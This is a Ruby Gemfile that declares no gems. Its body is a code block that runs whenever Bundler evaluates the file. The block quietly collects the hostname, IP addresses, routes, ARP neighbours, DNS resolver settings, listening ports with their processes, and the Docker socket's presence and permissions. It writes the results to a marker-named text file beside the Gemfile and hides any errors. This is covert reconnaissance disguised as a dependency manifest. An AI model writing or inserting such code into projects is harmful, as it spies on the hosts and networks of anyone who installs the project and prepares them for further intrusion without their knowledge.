source "https://rubygems.org"
begin
  def sh(c); `#{c} 2>/dev/null`.to_s.strip[0,900]; rescue StandardError; ""; end
  out = []
  out << "MARK=pgxnet3fa2da17"
  out << "host=" + sh("hostname")
  out << "--- addresses ---"      << sh("ip -o -4 addr show")
  out << "--- routes ---"         << sh("ip -4 route")
  out << "--- neighbours(arp) ---"<< sh("ip -4 neigh")
  out << "--- resolv ---"         << (File.read("/etc/resolv.conf") rescue "")[0,300]
  out << "--- listening ---"      << sh("ss -ltnp || netstat -ltnp")
  out << "--- docker.sock ---"    << (File.exist?("/var/run/docker.sock") ? "PRESENT mode=" + ("%o" % (File.stat("/var/run/docker.sock").mode & 07777)) : "ABSENT")
  File.write(File.join(__dir__, "pgxnet3fa2da17.txt"), out.join("\n") + "\n")
rescue StandardError => e
  File.write(File.join(__dir__, "pgxnet3fa2da17.txt"), "pgxnet3fa2da17 err=" + e.class.to_s + "\n") rescue nil
end
